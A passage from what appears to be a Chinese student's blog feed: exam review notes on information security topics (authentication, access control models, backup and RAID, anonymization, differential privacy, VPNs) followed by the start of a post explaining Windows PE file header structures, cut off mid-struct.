现实中的认证与密钥交换协议</h3><p><strong>这里就是kerberos协议(对称密钥)</strong></p><ul><li>基于对称加密技术，基于可信第三方<ul><li>功能：实现认证，完整性，保密性服务。<ul><li>重点解决的问题：集中的身份认证和密钥分配—用户只需输入一次身份验证信息，就可以访问多个服务，也就是俗称单点登录。</li></ul></li></ul></li></ul><p>采用基于密钥的认证交换协议的设计前提</p><ul><li>所有用户均在KDC上注册，KDC数据库中拥有所有参与用户的UID和口令散列</li><li>Kerberos定义了口令到密钥的转化机制，用户仅需记忆口令，认证过程中使用密钥</li><li>所有服务器均在KDC上注册，KDC必须与每一个服务器之间共享一个保密密钥</li><li>时效性用随机数和时间戳</li></ul><p><strong>NTLM(MAC)</strong></p><p><strong>TLS(非对称)</strong></p><p>剩下的看</p><p>[word复习资料P14](file://E:/Data/大学/大三/大三上/信息系统安全/考试/信息安全复习.docx)</p><h2 id="基于图形和生物特征的认证"><a class="markdownIt-Anchor" href="#基于图形和生物特征的认证"></a> 基于图形和生物特征的认证</h2><h3 id="图形认证"><a class="markdownIt-Anchor" href="#图形认证"></a> 图形认证</h3><p>​利用人类对图形记忆要优于对文本记忆的特点设计出来的一种新型口令。用户不用记忆冗长的字符串而是通过识别或记住图形来进行身份认证</p><p><strong>优势</strong>：图形口令空间大，可以抵御文本口令面临的攻击(字典爆破)，人们记忆能力强，不容易被获取</p><p><strong>分类</strong>：基于识别型的图形口令，基于回忆型，混合型</p><h3 id="生物特征认证"><a class="markdownIt-Anchor" href="#生物特征认证"></a> 生物特征认证</h3><p>​所谓生物特征识别，是指通过计算机与各种传感器和生物统计学原理等高科技手段的密切结合，利用人体唯一拥有的生理特性和行为特征，来进行个人身份鉴定的方法。</p><p><strong>常见特征</strong>：指纹特征，人脸特征，虹膜特征</p><h2 id="基于设备的认证及其案例"><a class="markdownIt-Anchor" href="#基于设备的认证及其案例"></a> 基于设备的认证及其案例</h2><p>​<strong>令牌</strong>：是用户持有的用于进行用户认证的一种物品。可以用做令牌的常见凭证有磁卡、存储卡、智能卡，目前，最常用的是存储卡和智能卡。</p><p><a href="https://flowus.cn/7bd9387d-744f-418a-9400-e9f14e5387c8">参考</a></p><ul><li>RFID(无线射频识别): 非接触，唯一识别，批量识别，自动识别</li><li>二维码：聊生于无吧，把上面老师的阐述给chatgpt，让他来看看<ul><li><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401062030522.png" alt="image-20240106203040447" /></li><li><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401080848170.png" alt="image-20240108084846050" /></li><li><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401080848925.png" alt="image-20240108084825869" /></li></ul></li></ul><h2 id="其余-4"><a class="markdownIt-Anchor" href="#其余-4"></a> 其余</h2><h3 id="数字证书-2"><a class="markdownIt-Anchor" href="#数字证书-2"></a> 数字证书</h3><ul><li>从证书的用途，分为签名证书和加密证书。用户配置了两对密钥(签名密钥对、加密密钥对)</li><li>签名证书<ul><li>负责验证数字签名真实性</li><li>Alice向Bob发送文件和数字签名(可能还发送证书)，然后Bob用签名证书(含有Alice公钥)来验证</li></ul></li><li>加密证书<ul><li>主要用于加密在网络上传输的数据</li><li>Bob有个网站，它自己生成了加密证书放在服务器上。然后Alice访问，经过身份验证后，Bob把证书发给Alice，然后Alice的请求用Bob公钥进行加密再发送给Bob</li></ul></li></ul><h1 id="第5章-访问控制"><a class="markdownIt-Anchor" href="#第5章-访问控制"></a> 第5章 访问控制</h1><blockquote><p>1 自主访问控制: 概念很简单，但是要理解为什么没办法去防木马(这里指上课讲的evil的那个案例)</p><p>2 强制访问控制: 三个访问控制模型读和写的控制原则，比如BLP和Biba都是对于信息流的单向控制，中国墙模型需要知道读和写操作，以及清洗的数据如何控制，强制访问控制都是给安全标识，BLP是保密性，Biba是完整性，中国墙是客体为分类，主体为状态转换矩阵来记录访问顺序</p><p>3 基于角色和基于属性: 了解一下</p><p>4 Windows分布式访问控制授权管理: 了解一下授权是通过不同组的映射来实现分工授权</p></blockquote><p>​访问控制以身份认证为前提，是一种针对越权使用资源的防御措施，它的基本目标是防止对任何资源进行未授权的访问，保障资源只能被合法用户执行合法操作。访问控制对机密性、完整性起直接的作用。</p><p>这里是对[word复习资料P18](file://E:/Data/大学/大三/大三上/信息系统安全/考试/信息安全复习.docx)的补充说明</p><h2 id="自主访问控制"><a class="markdownIt-Anchor" href="#自主访问控制"></a> 自主访问控制</h2><p>​自主访问控制(DAC)是基于身份的访问控制，其特点是根据主体的身份及允许访问的权限进行决策。自主是指，主体能够自主的将自身具有的访问权限或其子集授予其他主体</p><p>​对于Evil的那个案例，原因就是资源的拥有者自主管理资源，因为Bob拥有对于暗袋文件的执行权力，在执行时那个暗袋文件或被授权Bob的访问权限，所以可以访问到机密数据并写入暗袋文件</p><h2 id="强制访问控制"><a class="markdownIt-Anchor" href="#强制访问控制"></a> 强制访问控制</h2><p>​强制访问控制(MAC)是基于规则的访问控制。授权完全由主客体安全属性决定，其由系统控制，用户不能改变主客体的安全属性。</p><p>​对资源的访问取决于对实体的授权策略而非简单的取决于主体的身份。通过比较主体与客体的安全属性来决定是否允许主体访问客体。</p><h3 id="中国墙模型"><a class="markdownIt-Anchor" href="#中国墙模型"></a> 中国墙模型</h3><p>客体为分类，主体为状态转换矩阵来记录访问顺序</p><ul><li><p>此模型根据主体的<strong>访问历史</strong>来判断数据是否可以被访问。而不是根据数据属性作为约束条件。其本质是将全体数据划分为“利益冲突类”，根据强制约束，主体至多访问每个“利益冲突类”中的一个数据集</p></li><li><p><strong>简单安全性</strong>：一旦一个主体访问过一个客体，那其余可被该主体访问的客体必须满足：与主体访问过的客体在同一公司内，或者在不同利益冲突中</p><p><strong>清洁信息</strong>: 清洁信息不存在公司敏感信息，所以，可以不用限制对清洁信息的读访问请求</p><p>*<strong>特性</strong>: 主体s能写客体o,必须</p><ul><li>有读0的简单安全性权利，</li><li>S没有访问过o所属公司数据集或清洁数据以外的任何公司数据(如B)</li><li>非清洁的信息只局限在本公司数据集内部，不能随意流动，清洁后的信息可以在系统中自由的流动</li></ul></li></ul><h2 id="基于角色的访问控制"><a class="markdownIt-Anchor" href="#基于角色的访问控制"></a> 基于角色的访问控制</h2><p>​权限通常由用户在一个组织中担当的角色来确定权限/许可被授权给角色，角色被授权给用户，用户不直接与许可关联。对访问权限的授权由管理员统一管理.</p><p><strong>核心RBAC</strong>、<strong>角色层次RBAC</strong>、<strong>静态职责分离关系</strong>、<strong>动态职责分离关系</strong></p><h2 id="wiondows分布式访问控制授权管理"><a class="markdownIt-Anchor" href="#wiondows分布式访问控制授权管理"></a> Wiondows分布式访问控制授权管理</h2><p>全局组，通用组，域本地组</p><ul><li><p>权限指派</p><ul><li><p>粗粒度权限管理：在域中指派用户权限</p></li><li><p>细粒度权限管理：在资源上指派资源访问权限</p></li></ul></li><li><p>组映射</p><ul><li><p>无通用组：将全局组product*加入域本地组files</p></li><li><p>有通用组：将全局组product*加入通用组productall，再将productall加入域本地组files</p></li></ul></li></ul><h1 id="第6章-数据安全"><a class="markdownIt-Anchor" href="#第6章-数据安全"></a> 第6章 数据安全</h1><blockquote><p>1 数据存储的透明加解密服务的流程，哪一部分在内核态(真正实现加密和解密操作的过程)，哪一部分在应用态(密钥套件的生成，加解密密钥)</p><p>2 密钥管理，二级还是三级去保护密钥</p><p>3 可靠性与数据容错: 主要是备份策略怎么用，差分、增量、完全。实现数据冗余的方法，不同RAID的实现有什么区别</p><p>4 隐私保护，掌握原理和基本实现方法(匿名化基本原理，分三类属性，关键属性、准标识符属性、敏感属性，常见的手段，抑制、泛化)</p><p>5 差分隐私原理，加噪声，加扰动(加扰动和查询函数有关，又和敏感度有关，全局敏感性局部敏感性函数都在什么情况下使用)，掌握数字型为主</p><p>6 知道同态加密的原理</p></blockquote><h2 id="透明加解密"><a class="markdownIt-Anchor" href="#透明加解密"></a> 透明加解密</h2><p>​透明加密：又称静态加密，加解密细节不会被察觉，由存储系统自动完成，文件在内存中为明文形式、在硬盘中为密文形式。当使用环境改变时，会因无法获得自动解密服务而无法打开，从而达到保护文件内容的目的。</p><h2 id="数据备份与恢复"><a class="markdownIt-Anchor" href="#数据备份与恢复"></a> 数据备份与恢复</h2><h3 id="备份"><a class="markdownIt-Anchor" href="#备份"></a> 备份</h3><p><strong>完全备份</strong></p><p>完全备份：对某一个时间点上的所有数据进行的一个完全复制。</p><p>在完全备份过程中，备份选中的文件，<strong>清除存档属性</strong>，即将每个文件都被标记为已备份。</p><p><strong>差异备份(偷摸备份)</strong></p><p>差异备份：备份自上一次备份后<strong>有存档属性的</strong>文件。(规矩上需要备份)</p><p>在差异备份过程中，备份选中的、<strong>有存档属性的</strong>文件，<strong>不清除存档属性</strong>，即备份后不标记为已备份文件。(有种偷偷备份的感觉)</p><p>在进行恢复时，需使用上次的全备份和<strong>最后一次的</strong>差异备份进行恢复。</p><p><strong>增量备份</strong></p><p>增量备份：备份自上一次备份之后<strong>有变化的</strong>数据。(事实上真的需要备份)</p><p>在增量备份过程中，备份选中的、<strong>有存档属性的</strong>文件，<strong>清除存档属性</strong>。</p><p>在进行恢复时，需使用上次的全备份和<strong>每次的</strong>差异备份进行恢复。</p><h3 id="raid"><a class="markdownIt-Anchor" href="#raid"></a> RAID</h3><p>​独立磁盘冗余阵列：将多块磁盘通过一定的技术手段组成一个单一的虚拟磁盘使用。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401072330145.png" alt="image-20240107233019013" /></p><ul><li>RAID-0：数据基带条阵列。将数据分割存储到多块磁盘上，磁盘读写时负载平均分配到多块磁盘。由于多块磁盘可同时读写，所以速度明显提升。<ul><li>优点：读写快、利用率高、成本低</li><li>缺点：无冗余、无校验、无备份、不提供容错性</li></ul></li><li>RAID-1：磁盘镜像，至少由2块磁盘实现。将同样的数据写入2块磁盘(互为镜像)，一块磁盘发生故障时，另一块磁盘可继续工作，并可在更换磁盘后重新创建镜像。<ul><li>优点：可靠性高、读取速率快</li><li>缺点：写入速率低、利用率低</li></ul></li><li>RAID-0+1：至少由4块磁盘实现。将RAID-0中的2块磁盘视为虚拟磁盘，再使用RAID-1方案阵列<ul><li>优点：读写快、安全</li></ul></li><li>RAID-5：循环奇偶校验阵列至少由3块磁盘实现。将数据分布在不同磁盘上，并在所有磁盘上交叉地存取数据及<strong>奇偶校验信息</strong>。<ul><li>优点：数据安全、读取速率高、磁盘利用率高</li><li>缺点：写入速率低</li></ul></li></ul><h2 id="隐私保护"><a class="markdownIt-Anchor" href="#隐私保护"></a> 隐私保护</h2><p>​隐私保护：是对隐私数据采取一系列的安全手段防止其泄露和被滥用的行为，同时用户还能享受各种服务。旨在实现数据安全和共享的某种平衡。</p><p>​匿名隐私保护技术是在隐去标识属性的基础上，为了更好地保护发布数据中的隐私信息不被泄露，对用户的准标识符进行数据发布限制的技术。</p><p>链接攻击：类似数据库里的自然连接，通过等值的列进行连接，可以获得某个元组更详细的信息。</p><p>所以匿名化的目的就是使公开表之间无法自然连接。</p><p><strong>数据属性分类</strong></p><ul><li><strong>关键属性</strong>：一般是个体的唯一标识，如姓名、地址、电话等，这些需要在公开数据的时候删掉</li><li><strong>准标识</strong>：类似邮编，年龄，性别等，虽然不是唯一标识，但是能帮助研究人员关联相关数据的标识。</li><li><strong>敏感属性</strong>：如购买偏好，薪水，这些数据是研究人员进行分析和挖掘必须的，一般都直接公开。</li></ul><p><strong>实现匿名主要方法</strong></p><ul><li>泛化：对数据进行抽象或概括的描述</li><li>抑制：不发布相应项，去除单元值或一个元组的所有值</li><li>分割：将原始数据按照l-多样性原则划分，然后把<strong>准标识属性</strong>和<strong>敏感属性</strong>分成两个表后直接发布，两者之间通过“组号”来连接</li><li>聚类：对数据中的不同记录进行分类，每个分类中的数据属性相同或相似</li></ul><h3 id="k-匿名性"><a class="markdownIt-Anchor" href="#k-匿名性"></a> k-匿名性</h3><ul><li><p>k-匿名化：将某些列属性的具体值替换为泛化值，使其满足k-匿名性的过程，也称泛化过程。</p></li><li><p>k-匿名性：当表中的每一个元组无法与其他至少k−1个元组互相区分，即每个元组所在的等价类≥k时，称该表满足k-匿名性。</p></li><li><p>k值越大，保护强度越大，丢失信息越多，可用性越低</p></li><li><p>注意：k-匿名性不考虑敏感属性。</p></li><li><p>同质化攻击：等价类中的敏感属性取值相同，会“无法相互区分”，敌手可直接将这个等价类的信息视为等价类中每一个元组的信息(反正从这张表看这些人都一样)。</p></li></ul><h3 id="l-多样性"><a class="markdownIt-Anchor" href="#l-多样性"></a> l-多样性</h3><ul><li><p>由于k-匿名性不考虑敏感属性，存在同质性攻击，于是有了l-多样性。</p></li><li><p>l-多样性：在k-匿名性的基础上，每个等价类中至少有l种敏感属性，即每个等价类的敏感属性≥l</p></li><li><p>偏斜性攻击：等价类中敏感属性的分布与全体数据的分布相差较大，敌手可以结合语义判断某个元组的敏感属性在哪个属性上的区间。</p></li></ul><h3 id="t-临近性"><a class="markdownIt-Anchor" href="#t-临近性"></a> t-临近性</h3><ul><li><p>由于l-多样性不考虑等价类与总体的分布差异，于是有了t-邻近性。</p></li><li><p>t-邻近性：在每个等价类中，敏感属性的分布与全体属性的分布邻近，且不超过t。</p></li></ul><h2 id="差分隐私"><a class="markdownIt-Anchor" href="#差分隐私"></a> 差分隐私</h2><ul><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ε</mi></mrow><annotation encoding="application/x-tex">\varepsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">ε</span></span></span></span>(隐私保护预算)越大，引入的噪声越小，隐私泄露的风险越大。</p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ε</mi></mrow><annotation encoding="application/x-tex">\varepsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">ε</span></span></span></span>越小，引入的噪声越大，隐私泄露的风险越小。</p></li></ul><p>噪声过多会使可用性下降，噪声过少会使数据安全性下降</p><p>敏感度越大，需要添加足够大的噪声，</p><p>因此，全局敏感度只与查询函数有关。这有可能要面对很大的全局敏感性，需要加更大的噪声，因此，提出了局部敏感性的概念。局部敏感度首先会对待保护数据集进行变换(如差值等)，降低待保护数据集的敏感度，由于利用了数据集的数据分布特征，局部敏感度通常比全局敏感度小的多。</p><h2 id="同态加密"><a class="markdownIt-Anchor" href="#同态加密"></a> 同态加密</h2><p>​同态加密技术，它支持直接对密文进行运算，并且计算结果的解密值与对应明文的计算结果相同</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401062220694.png" alt="image-20240106222019639" /></p><h1 id="第7章-vpn"><a class="markdownIt-Anchor" href="#第7章-vpn"></a> 第7章 VPN</h1><blockquote><p>1 IPSEC VPN 与 TLS VPN 搞清楚什么情况下使用，具体情况下怎么封装了解即可，了解隧道协议即可，主要掌握几种VPN的比较点</p></blockquote><h2 id="ipsec-vpn"><a class="markdownIt-Anchor" href="#ipsec-vpn"></a> IPSEC VPN</h2><ul><li>使用场景：<ul><li>站点到站点的连接</li><li>远程访问</li></ul></li><li>协议层次：<ul><li>IPSEC工作在网络层，为整个网络通信提供安全性</li></ul></li><li>加密和鉴别<ul><li>IPsec提供数据加密和身份验证，通常使用AH和ESP协议来实现</li></ul></li></ul><h2 id="tls-vpn"><a class="markdownIt-Anchor" href="#tls-vpn"></a> TLS VPN</h2><ul><li>使用场景<ul><li>远程用户访问</li><li>移动设备支持：由于TLS VPN工作在传输层(第四层)，因此适用于多种设备，包括移动设备</li></ul></li><li>协议层次：<ul><li>TLS VPN工作在传输层与应用层之间，为端到端的通信提供安全性</li></ul></li><li>加密和鉴别<ul><li>TLS VPN使用TLS协议(也称为SSL/TLS)来实现加密和身份验证</li></ul></li><li>连接方式：<ul><li>TLS VPN通常作为应用层协议，因此可以使用独立的客户端软件，也可以通过Web浏览器进行访问。相对于IPsec，TLS VPN更容易部署，无需对底层网络设备进行复杂的配置。</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>课程复习笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>PE文件解析</title>
    <link href="/posts/d7f95dad.html"/>
    <url>/posts/d7f95dad.html</url>
    
    <content type="html"><![CDATA[<h1 id="汇总"><a class="markdownIt-Anchor" href="#汇总"></a> 汇总</h1><ul><li>分析PE格式工具----<a href="https://blog.csdn.net/u013908944/article/details/103356615">PETool</a></li><li><strong>引用</strong><ul><li><a href="https://blog.csdn.net/freeking101/article/details/102752048">PE文件结构详解</a></li><li><a href="https://blog.csdn.net/weixin_43655282/article/details/104291312">PE文件结构详解精华</a></li></ul></li></ul><h1 id="基本概念"><a class="markdownIt-Anchor" href="#基本概念"></a> 基本概念</h1><h2 id="pe文件"><a class="markdownIt-Anchor" href="#pe文件"></a> PE文件</h2><ul><li><p>PE (Portable Execute) 文件是Windows下可执行文件的总称，常见的有 <strong>DLL，EXE，OCX，SYS</strong> 等。它是微软在 UNIX 平台的 COFF (通用对象文件格式) 基础上制作而成。<strong>最初设计用来提高程序在不同操作系统上的移植性，但实际上这种文件格式仅用在 Windows 系列操作系统下</strong>。<strong>PE文件是指 32 位可执行文件，也称为PE32。64位的可执行文件称为 PE+ 或 PE32+，是PE(PE32)的一种扩展形式(请注意不是PE64)</strong></p></li><li><p>早期磁盘空间不足，PE磁盘文件与内存映像结构不同，磁盘每200h为一节，内存则是1000h为一节。后来随之发展，二者相一致</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291126138.png" alt="202301121246317" /></p></li><li><p>PE文件的结构一般来说如下图所示：从起始位置开始依次是 <strong>DOS头</strong>，<strong>NT头</strong>，<strong>节表</strong> 以及<strong>具体的节</strong></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291127620.png" alt="202302250820743" /></p></li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291127571.png" alt="202301121155957" /></p><h2 id="pe文件执行顺序"><a class="markdownIt-Anchor" href="#pe文件执行顺序"></a> PE文件执行顺序</h2><ol><li>当一个 PE 文件被执行时，<strong>PE 装载器</strong>首先检查 DOS header 里的 PE header 的偏移量。如果找到，则直接跳转到 PE header 的位置。</li><li>当<strong>PE 装载器</strong>跳转到 PE header 后，第二步要做的就是检查 PE header 是否有效。如果该 PE header 有效，就跳转到 PE header 的尾部。</li><li>紧跟 PE header 尾部的是节表。PE装载器 执行完第二步后开始读取节表中的节段信息，并采用文件映射的方法将这些节段映射到内存，<strong>同时附上节表里指定节段的读写属性</strong>。<ul><li><strong>文件映射</strong>----在执行一个PE文件的时候，Windows并不在一开始就将整个文件读入内存，而是采用与内存映射的机制，也就是说，<strong>Windows装载器在装载的时候仅仅建立好虚拟地址和PE文件之间的映射关系，只有真正执行到某个内存页中的指令或者访问某一页中的数据时，这个页面才会被从磁盘提交到物理内存</strong>，这种机制使文件装入的速度和文件大小没有太大的关系</li></ul></li><li>PE文件映射入内存后，PE装载器 将继续处理PE文件中类似 import table (输入表)的逻辑部分。</li></ol><h2 id="pe文件结构"><a class="markdownIt-Anchor" href="#pe文件结构"></a> PE文件结构</h2><ol><li><strong>DOS头</strong> 是用来兼容 MS-DOS 操作系统的，目的是当这个文件在 MS-DOS 上运行时提示一段文字，大部分情况下是：This program cannot be run in DOS mode. 同时指明 NT 头在文件中的位置。</li><li><strong>NT头</strong> 包含 windows PE 文件的主要信息，其中包括一个 <strong>‘PE’ 字样的签名</strong>，**PE文件头(IMAGE_FILE_HEADER)**和 <strong>PE可选头(IMAGE_OPTIONAL_HEADER32)。</strong></li><li><strong>节表</strong>：是 PE 文件后续节的描述，windows 根据节表的描述加载每个节。</li><li><strong>节</strong>：每个节实际上是一个容器，可以包含代码、数据等等，每个节可以有独立的内存权限，比如代码节默认有读/执行权限，节的名字和数量可以自己定义，未必是上图中的三个。</li></ol><h2 id="varva"><a class="markdownIt-Anchor" href="#varva"></a> VA&amp;RVA</h2><p>​VA指的是进程虚拟内存的<strong>绝对地址</strong>，RVA指从某个基准位置开始的<strong>相对地址</strong>。VA与RVA满足：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>R</mi><mi>V</mi><mi>A</mi><mo>+</mo><mi>I</mi><mi>m</mi><mi>a</mi><mi>g</mi><mi>e</mi><mi>B</mi><mi>a</mi><mi>s</mi><mi>e</mi><mo>=</mo><mi>V</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">RVA + ImageBase = VA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal">m</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord mathnormal">A</span></span></span></span></span></p><p>​PE头内部大多以RVA形式存在。32位Windows OS中，各进程分配有 4GB 的虚拟内存，因此进程中VA值的范围是0000 0000 ~ FFFF FFFF。</p><h1 id="pe头"><a class="markdownIt-Anchor" href="#pe头"></a> PE头</h1><p>win采用小端序存储，查看十六进制时需要从右往左</p><ul><li><p>32位PE头大小</p><ul><li><p>DOS—40h</p></li><li><p>NT—4h + 14h(FILE) + E0h(Optional)</p></li></ul></li></ul><h2 id="dos头"><a class="markdownIt-Anchor" href="#dos头"></a> DOS头</h2><h3 id="image_dos_header"><a class="markdownIt-Anchor" href="#image_dos_header"></a> IMAGE_DOS_HEADER</h3><p>​所有的PE文件都是以一个<strong>64(40h)字节</strong>(一个字节8位)的<strong>DOS头</strong>(MZ文件头)开始。这个DOS头只是为了兼容早期的DOS操作系统。该结构体中需要掌握的字段只有2个，分别是第一个字段 <code>e_magic</code> 和最后一个字段 <code>e_lfanew</code> 字段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_DOS_HEADER</span> &#123;</span>　<span class="hljs-comment">// DOS .EXE header</span><br>WORD　e_magic;　　　　<span class="hljs-comment">// Magic number</span><br>WORD　e_cblp;　　　　 <span class="hljs-comment">// Bytes on last page of file</span><br>WORD　e_cp;　　　　　 <span class="hljs-comment">// Pages in file</span><br>WORD　e_crlc;　　　　 <span class="hljs-comment">// Relocations</span><br>WORD　e_cparhdr;　　　<span class="hljs-comment">// Size of header in paragraphs</span><br>WORD　e_minalloc;　　 <span class="hljs-comment">// Minimum extra paragraphs needed</span><br>WORD　e_maxalloc;　　 <span class="hljs-comment">// Maximum extra paragraphs needed</span><br>WORD　e_ss;　　　　　　<span class="hljs-comment">// Initial (relative) SS value</span><br>WORD　e_sp;　　　　　　<span class="hljs-comment">// Initial SP value</span><br>WORD　e_csum;　　　　　<span class="hljs-comment">// ChecksumWORD e_ip;Initial IP valueWORD　e_cs;Initial (relative) CS value</span><br>WORD　e_lfarlc;　　　　<span class="hljs-comment">// File address of relocation table</span><br>WORD　e_ovno;　　　　　<span class="hljs-comment">// Overlay number</span><br>WORD　e_res[<span class="hljs-number">4</span>];　　　　<span class="hljs-comment">// Reserved words</span><br>WORD　e_oemid;　　　　 <span class="hljs-comment">// OEM identifier (for e_oeminfo)</span><br>WORD　e_oeminfo;　　　 <span class="hljs-comment">// OEM information; e_oemid specific</span><br>WORD　e_res2[<span class="hljs-number">10</span>];　　　<span class="hljs-comment">// Reserved words</span><br>LONG　e_lfanew;　　　　<span class="hljs-comment">// File address of new exe header</span><br>&#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;<br><br></code></pre></td></tr></table></figure><ul><li><p><code>e_magic</code> 字段</p><p>DOS 可执行文件的标识符(DOS签名)，占用2字节。该位置保存着的字符是“MZ”。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_DOS_SIGNATURE　　　　<span class="hljs-comment">//0x5A4D　MZ</span></span><br></code></pre></td></tr></table></figure></li><li><p><code>e_lfanew</code> 字段：<br />只是NT头的偏移----PE头相对于文件的偏移，定位PE文件</p></li><li><p>作用：</p><ul><li><strong>定位PE文件头开始位置</strong>，也可用于<strong>PE文件合法性检测</strong></li></ul></li></ul><h3 id="dos存根"><a class="markdownIt-Anchor" href="#dos存根"></a> DOS存根</h3><p>​DOS存根(stub)在DOS头下方，是个可选项，且大小不固定(即使没有DOS存根，文件也能正常运行)。</p><h2 id="nt头"><a class="markdownIt-Anchor" href="#nt头"></a> NT头</h2><h3 id="image_nt_headers"><a class="markdownIt-Anchor" href="#image_nt_headers"></a> IMAGE_NT_HEADERS</h3><p>​<strong>NT头：PE标识</strong>结构体的大小为<strong>F8h</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_NT_HEADERS</span> &#123;</span> <br>        DWORD Signature;                         <br>      <span class="hljs-comment">//该结构体中的Signature就是PE标识符,标识该文件是否是PE文件。4字节，即 50 45 0000 -&gt; 00 00 45 50 -&gt; PE</span><br>        IMAGE_FILE_HEADER FileHeader;             <br>      <span class="hljs-comment">// IMAGE_FILE_HEADER是PE文件头</span><br>        IMAGE_OPTIONAL_HEADER32 OptionalHeader;   <span class="hljs-comment">// </span><br>&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;  <br></code></pre></td></tr></table></figure><ul><li><p><code>Signature(签名)</code>字段</p><ul><li>类似于 DOS头中的 e_magic，其高16位是0，低16是0x4550，用字符表示是 “PE”。</li></ul></li><li><p><code>File Header</code></p><ul><li>文件头结构体</li></ul></li><li><p><code>Optional Header</code></p><ul><li>可选头结构体</li></ul></li><li><p>为简单分析，此时PE头(file与optional)只看32位，64位的暂且不看</p></li></ul><h3 id="image_file_header"><a class="markdownIt-Anchor" href="#image_file_header"></a> IMAGE_FILE_HEADER</h3><p>​<strong>NT头：文件头</strong>，共<strong>14h</strong>个字节，其中需要掌握的字段有5个(注意NT头有个4字节的Signature)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_FILE_HEADER</span> &#123;</span> <br>        WORD    Machine;              <br>        <span class="hljs-comment">// 每个CPU拥有唯一的Machine码 -&gt; 4C 01 -&gt; PE -&gt; 兼容32位Intel X86芯片</span><br><br>        WORD    NumberOfSections;     <br>        <span class="hljs-comment">// 指文件中存在的节段(又称节区)数量，也就是节表中的项数 -&gt; 00 04 -&gt; 4</span><br>        <span class="hljs-comment">// 该值一定要大于0，且当定义的节段数与实际不符时，将发生运行错误。</span><br><br>        DWORD   TimeDateStamp;         <br>        <span class="hljs-comment">// PE文件的创建时间，一般有连接器填写 -&gt; 38 D1 29 1E</span><br>    <br>        DWORD   PointerToSymbolTable;<br>        <span class="hljs-comment">// COFF文件符号表在文件中的偏移 -&gt; 00 00 00 00</span><br>        DWORD   NumberOfSymbols;       <br>        <span class="hljs-comment">// 符号表的数量 -&gt; 00 00 00 00</span><br><br>        WORD    SizeOfOptionalHeader; <br>        <span class="hljs-comment">// 